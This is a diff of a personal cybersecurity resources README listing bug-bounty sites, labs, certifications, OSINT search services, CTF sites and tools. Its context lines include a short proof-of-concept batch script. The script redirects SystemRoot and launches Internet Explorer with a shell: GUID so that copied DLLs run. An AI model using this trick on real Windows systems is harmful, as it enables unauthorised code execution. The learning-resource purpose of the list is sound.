@@ -1,8 +1,15 @@
 # RandomCyberStuff
 
+### Bug Hunting 
 
 ## Bug Hunting sites
 
+ - Pentesterlab: https://pentesterlab.com/
+ - hackthebox: https://www.hackthebox.com/
+
+ ### Labs 
+ - Portswigger Web Academy: https://portswigger.net/web-security
+ - Tryhackme: https://tryhackme.com/
  - Pentesterlab: https://pentesterlab.com/
  - hackthebox: https://www.hackthebox.com/
  
@@ -19,15 +26,24 @@
 
 ## Certs
 
-### PNPT Practical Network Penetration Tester Certification
-- https://certifications.tcm-sec.com/pnpt/
+### TCM Security
+- PNPT Practical Network Penetration Tester Certification https://certifications.tcm-sec.com/pnpt/
+- PJPT Practical Junior Penetration Tester https://certifications.tcm-sec.com/pjpt/
 
 ### eCPPT - eLearnSecurity Certified Professional Penetration Tester
 - [eLearnSecurity Certified Professional Penetration Tester](https://elearnsecurity.com/product/ecpptv2-certification/)
 
+### CEH Certified Ethical Hacker
+- https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
+
+### Offensive Security certification
+- OSCP
+- OSCE
+- OSWE
+- OSEP
 
 ## IE running code
-IE navigating to `shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}` you can spawn System restore. If you modify the `SystemRoot` enviroment variable and copy over DLLs you run them.
+IE navigating to `shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}` you can spawn System restore. If you modify the `SystemRoot` environment variable and copy over DLLs you run them.
 
 
 POC: 
@@ -38,7 +54,7 @@ copy %a% %temp%\System32\rstrui.exe /Y > NUL
 set SystemRoot=%temp%
 start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
 
-## Search resources 
+## Search Resources 
 
 1. DeHashed—View leaked credentials.
 2. SecurityTrails—Extensive DNS data.
@@ -62,7 +78,7 @@ start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
 20. Netlas—Search and monitor internet connected assets.
 21. CRT sh—Search for certs that have been logged by CT.
 22. Wigle—Database of wireless networks, with statistics.
-23. PublicWWW—Marketing and affiliate marketing research.
+23. PublicWWW—Marketing, and affiliate marketing research.
 24. Binary Edge—Scans the internet for threat intelligence.
 25. GreyNoise—Search for devices connected to the internet.
 26. Hunter—Search for email addresses belonging to a website.
@@ -70,3 +86,20 @@ start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}
 28. IntelligenceX—Search Tor, I2P, data leaks, domains, and emails.
 29. Packet Storm Security—Browse latest vulnerabilities and exploits.
 30. SearchCode—Search 75 billion lines of code from 40 million projects.
+ 
+## CTF Sites 
+- Pico CTF: https://play.picoctf.org/
+
+- CTF learn: https://ctflearn.com/
+
+## Software / Tools
+
+- SNORT
+- OpenDNS
+- EnCase
+- SIFT
+
+## Training 
+
+- OPSWAT academy https://opswatacademy.com/page/course-list
+
